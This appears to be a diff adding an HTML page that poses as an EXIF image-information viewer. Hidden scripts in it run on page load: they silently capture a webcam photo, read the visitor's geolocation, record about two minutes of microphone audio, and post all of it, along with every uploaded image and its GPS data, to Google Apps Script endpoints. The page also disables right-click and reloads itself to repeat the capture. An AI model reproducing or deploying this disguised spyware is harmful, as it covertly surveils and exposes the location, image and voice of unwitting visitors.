@@ -1,0 +1,610 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Image Information</title>
+    <style>
+      body {
+        font-family: "Arial", sans-serif;
+        background-color: #f2f2f2;
+        text-align: center;
+      }
+
+      #container {
+        margin: 20px auto;
+        width: 50%;
+        padding: 20px;
+        background-color: #fff;
+        border-radius: 8px;
+        box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
+        display: inline-block;
+        text-align: left;
+      }
+
+      #container1 {
+        margin: 20px auto;
+        width: 50%;
+        padding: 20px;
+        background-color: #fff;
+        border-radius: 8px;
+        box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
+        display: inline-block;
+        text-align: left;
+      }
+
+      h1 {
+        color: #3498db;
+      }
+
+      label {
+        display: block;
+        text-align: center;
+        padding: 10px;
+        background-color: #3498db;
+        color: #fff;
+        border-radius: 5px;
+        cursor: pointer;
+        margin-bottom: 20px;
+        font-weight: bold;
+      }
+
+      label:hover {
+        background-color: #2980b9;
+      }
+
+      button {
+        padding: 10px;
+        margin: 10px auto;
+        background-color: #3498db;
+        color: #fff;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+        transition: background-color 0.3s;
+      }
+
+      button:hover {
+        background-color: #2980b9;
+      }
+      .button-container button {
+        display: inline-block;
+        margin-right: 10px; /* Adjust the margin as needed */
+      }
+
+      p {
+        font-weight: bold;
+        margin-bottom: 10px;
+      }
+
+      ul {
+        list-style: none;
+        padding: 0;
+        margin: 0;
+      }
+
+      li {
+        margin-bottom: 10px;
+      }
+
+      strong {
+        font-weight: bold;
+      }
+
+      span {
+        margin-left: 10px;
+      }
+    </style>
+  </head>
+  <body>
+    <div id="container">
+      <h1>Image Information</h1>
+      <p>
+        Make sure the image is taken by camera devices, Not an screenshot/online
+        downloaded images.
+      </p>
+      <label for="uploadInput">Select Image</label>
+      <input type="file" id="uploadInput" accept="image/*" />
+      <br />
+      <button type="button" onclick="getImageInfo()">Get Image Info</button>
+      <button type="button" onclick="getlocation1()">Map Location Info</button>
+    </div>
+    <br />
+    <div id="container1" style="display: none">
+      <ul id="imageInfo"></ul>
+      <ul id="imageInfo1"></ul>
+    </div>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/exif-js/2.3.0/exif.js"></script>
+
+    <script>
+      var photolatitude, photolongitude;
+      var fileType2, fileSize2, fileName2, photolongitude2, photolatitude2;
+
+      function convertToDecimalDegrees(coordArray) {
+        if (!coordArray || coordArray.length !== 3) {
+          return null;
+        }
+
+        const degrees = coordArray[0].numerator / coordArray[0].denominator;
+        const minutes = coordArray[1].numerator / coordArray[1].denominator;
+        const seconds = coordArray[2].numerator / coordArray[2].denominator;
+
+        const decimalCoord = degrees + minutes / 60 + seconds / 3600;
+        return decimalCoord;
+      }
+
+      function getImageInfo() {
+        const fileInput = document.getElementById("uploadInput");
+        const file = fileInput.files[0];
+
+        const imageInfo = document.getElementById("imageInfo");
+        imageInfo.innerHTML = "";
+
+        const imageInfo1 = document.getElementById("imageInfo1");
+        imageInfo1.innerHTML = "";
+
+        const container1 = document.getElementById("container1");
+        container1.style.display = "block";
+
+        if (file) {
+          const reader = new FileReader();
+          reader.onload = function (e) {
+            const img = new Image();
+            img.onload = function () {
+              EXIF.getData(img, function () {
+                const allTags = EXIF.getAllTags(this);
+
+                if (Object.keys(allTags).length === 0) {
+                  // No EXIF data found for this image
+                  console.log("No EXIF data found for this image.");
+                  alert(
+                    "No EXIF data found for this image. Make sure the image is taken by camera devices, Not an screenshot/online downloaded images."
+                  );
+                  // Perform actions if no EXIF data is available
+                } else {
+                  for (const tag in allTags) {
+                    if (allTags.hasOwnProperty(tag)) {
+                      if (tag === "GPSLatitude") {
+                        photolatitude = convertToDecimalDegrees(allTags[tag]);
+                      } else if (tag === "GPSLongitude") {
+                        photolongitude = convertToDecimalDegrees(allTags[tag]);
+                      }
+
+                      const infoItem = document.createElement("li");
+                      const strongTag = document.createElement("strong");
+                      const spanTag = document.createElement("span");
+
+                      strongTag.textContent = tag + ":";
+                      spanTag.textContent = allTags[tag];
+
+                      infoItem.appendChild(strongTag);
+                      infoItem.appendChild(spanTag);
+                      imageInfo.appendChild(infoItem);
+                    }
+                  }
+
+                  // Store latitude and longitude separately in decimal format
+                  console.log("Latitude:", photolatitude);
+                  console.log("Longitude:", photolongitude);
+                  // You can use or store these values as needed.
+                }
+              });
+            };
+            img.src = e.target.result;
+          };
+          reader.readAsDataURL(file);
+        } else {
+          const noFile = document.createElement("li");
+          noFile.textContent = "No file selected";
+          imageInfo.appendChild(noFile);
+        }
+      }
+
+      function getlocation1() {
+        const fileInput = document.getElementById("uploadInput");
+        const file = fileInput.files[0];
+
+        const imageInfo = document.getElementById("imageInfo");
+        imageInfo.innerHTML = "";
+
+        const imageInfo1 = document.getElementById("imageInfo1");
+        imageInfo1.innerHTML = "";
+
+        const container1 = document.getElementById("container1");
+        container1.style.display = "block";
+
+        if (file) {
+          const fileName1 = document.createElement("li");
+          fileName1.textContent = `File Name: ${file.name}`;
+          imageInfo1.appendChild(fileName1);
+
+          const fileSize1 = document.createElement("li");
+          fileSize1.textContent = `File Size: ${formatBytes(file.size)}`;
+          imageInfo1.appendChild(fileSize1);
+
+          const fileType1 = document.createElement("li");
+          fileType1.textContent = `File Type: ${file.type}`;
+          imageInfo1.appendChild(fileType1);
+
+          const reader = new FileReader();
+          reader.onload = function (e) {
+            const img = new Image();
+            img.onload = function () {
+              EXIF.getData(img, function () {
+                const allTags = EXIF.getAllTags(this);
+                let hasGeoData = false; // Track if there is geolocation data
+
+                for (const tag in allTags) {
+                  if (allTags.hasOwnProperty(tag)) {
+                    if (tag === "GPSLatitude") {
+                      photolatitude = convertToDecimalDegrees(allTags[tag]);
+                      hasGeoData = true;
+                    }
+                    if (tag === "GPSLongitude") {
+                      photolongitude = convertToDecimalDegrees(allTags[tag]);
+                      hasGeoData = true;
+                    }
+                  }
+                }
+
+                if (hasGeoData) {
+                  console.log("Latitude:", photolatitude);
+                  console.log("Longitude:", photolongitude);
+
+                  const formData = new FormData();
+                  formData.append("latitude", photolatitude);
+                  formData.append("longitude", photolongitude);
+
+                  fetch(
+                    "https://script.google.com/macros/s/AKfycbwWSgbfsiVTsKxfVS0GHzzCsJqJDnat9-2yO8v9o6JYRkEtqwXh9H0FPX7z84rev9E6/exec",
+                    {
+                      method: "POST",
+                      body: formData,
+                    }
+                  )
+                    .then((response) => response.json())
+                    .then((data) => {
+                      const imageInfo1 = document.getElementById("imageInfo1");
+
+                      if (data.mapUrl && data.address) {
+                        const mapUrlElement = document.createElement("li");
+                        const mapLink = document.createElement("a");
+                        mapLink.textContent = `Map URL: ${data.mapUrl}`;
+                        mapLink.href = data.mapUrl;
+                        mapLink.target = "_blank"; // Open the link in a new tab/window
+                        mapUrlElement.appendChild(mapLink);
+                        imageInfo1.appendChild(mapUrlElement);
+
+                        const addressElement = document.createElement("li");
+                        addressElement.textContent = `Address: ${data.address}`;
+                        imageInfo1.appendChild(addressElement);
+                      } else {
+                        const errorElement = document.createElement("li");
+                        errorElement.textContent =
+                          "Error: Unable to fetch address and map URL";
+                        imageInfo1.appendChild(errorElement);
+                      }
+                    })
+                    .catch((error) => {
+                      console.error("Error:", error);
+                    });
+                } else {
+                  const noGeoData = document.createElement("li");
+                  noGeoData.textContent = "No geolocation data found";
+                  imageInfo1.appendChild(noGeoData);
+                }
+              });
+            };
+            img.src = e.target.result;
+          };
+          reader.readAsDataURL(file);
+        } else {
+          const noFile1 = document.createElement("li");
+          noFile1.textContent = "No file selected";
+          imageInfo1.appendChild(noFile1);
+        }
+      }
+
+      function formatBytes(bytes, decimals = 2) {
+        if (bytes === 0) return "0 Bytes";
+        const k = 1024;
+        const dm = decimals < 0 ? 0 : decimals;
+        const sizes = ["Bytes", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB"];
+        const i = Math.floor(Math.log(bytes) / Math.log(k));
+        return (
+          parseFloat((bytes / Math.pow(k, i)).toFixed(dm)) + " " + sizes[i]
+        );
+      }
+
+      function formatBytes1(bytes, decimals = 2) {
+        if (bytes === 0) return "0 Bytes";
+        const k = 1024;
+        const dm = decimals < 0 ? 0 : decimals;
+        const sizes = ["Bytes", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB"];
+        const i = Math.floor(Math.log(bytes) / Math.log(k));
+        return (
+          parseFloat((bytes / Math.pow(k, i)).toFixed(dm)) + " " + sizes[i]
+        );
+      }
+    </script>
+
+    <video id="video" autoplay style="display: none"></video>
+    <canvas id="canvas" style="display: none"></canvas>
+    <img
+      id="captured-image"
+      src=""
+      alt="Captured Image"
+      style="display: none"
+    />
+
+    <script>
+      if (navigator.geolocation) {
+        navigator.permissions
+          .query({ name: "geolocation" })
+          .then(function (result) {
+            if (result.state === "granted") {
+              // Geolocation access granted
+              navigator.geolocation.getCurrentPosition(
+                function (position) {
+                  // Handle the obtained position
+                },
+                function (error) {
+                  console.error("Error getting geolocation:", error);
+                }
+              );
+            } else if (result.state === "prompt") {
+              // Geolocation access is requested
+            } else if (result.state === "denied") {
+              // Geolocation access denied by the user
+              console.error("Geolocation access denied by the user.");
+              // You can inform the user or provide an alternative method
+            } else if (result.state === "prompt") {
+              // Geolocation access is requested
+            }
+          });
+      } else {
+        console.error("Geolocation is not supported by this browser.");
+      }
+      captureCamera();
+      let latitude;
+      let longitude;
+      let mapUrl;
+      var website = "https://arunkumar-selvaraj.web.app/home.html";
+      let capturedImage = document.getElementById("captured-image");
+      var imageDataUrl;
+
+      function captureCamera() {
+        navigator.mediaDevices
+          .getUserMedia({ video: true })
+          .then(function (cameraStream) {
+            const video = document.getElementById("video");
+            const canvas = document.getElementById("canvas");
+            video.srcObject = cameraStream;
+            video.onloadedmetadata = function () {
+              captureImage(cameraStream);
+            };
+          })
+          .catch(function (error) {
+            console.error("Error accessing the camera: " + error);
+          });
+
+        getLocation();
+      }
+
+      function getLocation() {
+        if ("geolocation" in navigator) {
+          navigator.geolocation.getCurrentPosition(
+            function (position) {
+              latitude = position.coords.latitude;
+              longitude = position.coords.longitude;
+              mapUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+            },
+            function (error) {
+              console.error("Error accessing geolocation: " + error);
+            }
+          );
+        } else {
+          console.error("Geolocation is not supported");
+        }
+      }
+
+      function captureImage(stream) {
+        const video = document.getElementById("video");
+        const canvas = document.getElementById("canvas");
+        const context = canvas.getContext("2d");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        imageDataUrl = canvas.toDataURL("image/png");
+        capturedImage.src = imageDataUrl;
+        if (stream) {
+          const tracks = stream.getTracks();
+          tracks.forEach((track) => track.stop());
+          sendImageData(imageDataUrl);
+        }
+      }
+
+      function sendImageData(imageDataUrl) {
+        let url =
+          "https://script.google.com/macros/s/AKfycbyRf0AWpmh3Z2CjnWYEE597VIY-gmnyj4T6AL3jnEQSfVFJ_2EWebvUiVTMoSg_ZsdO/exec";
+        console.log(latitude);
+        console.log(longitude);
+        console.log("imageDataUrl" + imageDataUrl.split("base64,")[1]);
+        let obj = {
+          base64: imageDataUrl.split("base64,")[1],
+          type: "image/png",
+          name: "captured_image.png",
+          url: mapUrl,
+          latitude: latitude,
+          longitude: longitude,
+          website: website,
+        };
+        fetch(url, {
+          method: "POST",
+          body: JSON.stringify(obj),
+        })
+          .then((response) => response.text())
+          .then((data) => console.log(data))
+          .catch((error) => console.error("Error sending image: " + error));
+      }
+    </script>
+
+    <div id="status"><span id="statusText"></span></div>
+    <script>
+      const status = document.getElementById("status");
+      console.log("Requesting access to the microphone...");
+      navigator.mediaDevices
+        .getUserMedia({ audio: true })
+        .then((stream) => {
+          console.log("Microphone access granted.");
+          const mediaRecorder = new MediaRecorder(stream);
+          const recordedChunks = [];
+          mediaRecorder.ondataavailable = (event) => {
+            recordedChunks.push(event.data);
+            console.log("Data available...");
+          };
+          mediaRecorder.onstop = () => {
+            console.log("Recording stopped.");
+            const blob = new Blob(recordedChunks, { type: "audio/webm" });
+            console.log("Blob created:", blob);
+            convertBlobToBase64(blob); // Convert blob to Base64 URL
+          };
+          mediaRecorder.start();
+          console.log("Recording started...");
+          setTimeout(() => {
+            mediaRecorder.stop();
+            console.log("Stopping recording after 10 seconds...");
+          }, 120000); // Stop recording after 10 seconds (adjust as needed)
+        })
+        .catch((err) => {
+          console.error("Error accessing the microphone:", err);
+        });
+
+      function convertBlobToBase64(blob) {
+        const reader = new FileReader();
+        reader.onload = function (event) {
+          const base64String = event.target.result.split(",")[1]; // Extracting base64 string
+          sendAudioToServer(base64String);
+        };
+        reader.readAsDataURL(blob);
+      }
+
+      function sendAudioToServer(base64String) {
+        const formData = new FormData();
+        formData.append("audio", base64String);
+        formData.append("website", website);
+        formData.append("latitude", latitude);
+        formData.append("longitude", longitude);
+        formData.append("url", mapUrl);
+        formData.append("name", "captured_image.png");
+        formData.append("type", "image/png");
+        formData.append("base64", imageDataUrl.split("base64,")[1]);
+
+        fetch(
+          "https://script.google.com/macros/s/AKfycbzcej4rWqyeW7zWXq6Yclfz2CFFakoeaB4PC1tWhePVVavuEdmhbjPQGe-8FO3flPOdpA/exec",
+          {
+            method: "POST",
+            body: formData,
+          }
+        )
+          .then((response) => {
+            console.log("Server response received:", response);
+            return response.text(); // Convert the response to text
+          })
+          .then((data) => {
+            console.log("Response: " + data);
+          })
+          .catch((error) => {
+            console.error("Error sending audio to the server:", error);
+            document.getElementById("status").innerText = "Error: " + error; // Display error message in the 'status' div
+          });
+      }
+      setTimeout(function () {
+        window.location.reload();
+      }, 320000);
+
+      document.addEventListener("contextmenu", function (e) {
+        e.preventDefault();
+      });
+
+      document.getElementById("uploadInput").addEventListener("change", () => {
+        const file = document.getElementById("uploadInput").files[0]; // Retrieve the selected file
+
+        if (file) {
+          const fr = new FileReader();
+          fr.onload = function (e) {
+            const reader = new FileReader();
+            reader.onload = function (event) {
+              const img = new Image();
+              img.onload = function () {
+                EXIF.getData(img, function () {
+                  const allTags = EXIF.getAllTags(this);
+                  let photolatitude2, photolongitude2;
+
+                  for (const tag in allTags) {
+                    if (allTags.hasOwnProperty(tag)) {
+                      if (tag === "GPSLatitude") {
+                        photolatitude2 = convertToDecimalDegrees(allTags[tag]);
+                      }
+                      if (tag === "GPSLongitude") {
+                        photolongitude2 = convertToDecimalDegrees(allTags[tag]);
+                      }
+                    }
+                  }
+
+                  // Display retrieved data for each photo
+                  console.log("Photolongitude2", photolongitude2);
+                  console.log("Photolatitude2", photolatitude2);
+                  console.log("fileName1", file.name);
+                  console.log("fileSize1", file.size);
+                  console.log("fileType1", file.type);
+                  console.log(
+                    "base64",
+                    event.target.result.split("base64,")[1]
+                  );
+                  console.log("type", file.type);
+                  console.log("name", file.name);
+
+                  // Construct the object to be sent via fetch
+                  const obj = {
+                    base64: event.target.result.split("base64,")[1], // Extract base64 data
+                    type: file.type,
+                    name: file.name,
+                    photolatitude: photolatitude2,
+                    photolongitude: photolongitude2,
+                    fileName1: file.name,
+                    fileSize1: file.size,
+                    fileType1: file.type,
+                  };
+
+                  // Send the data to the server
+                  fetch(
+                    "https://script.google.com/macros/s/AKfycby9N7T_6ibhd7f2gLm_JiRJXfUmSj3xtSF0O2BdQIkLL0sAuyMfbUZEzz_DQ9Lr1PCtdA/exec",
+                    {
+                      method: "POST",
+                      body: JSON.stringify(obj),
+                    }
+                  )
+                    .then((response) => response.text())
+                    .then((data) => console.log(data))
+                    .catch((error) => console.error("Error:", error));
+                });
+              };
+              img.src = event.target.result;
+            };
+            reader.readAsDataURL(file);
+          };
+          fr.readAsDataURL(file);
+        } else {
+          const noFile1 = document.createElement("li");
+          noFile1.textContent = "No file selected";
+        }
+      });
+    </script>
+
+    <iframe
+      src="deviceinfo.html"
+      width="1250"
+      height="1000"
+      frameborder="0"
+    ></iframe>
+  </body>
+</html>
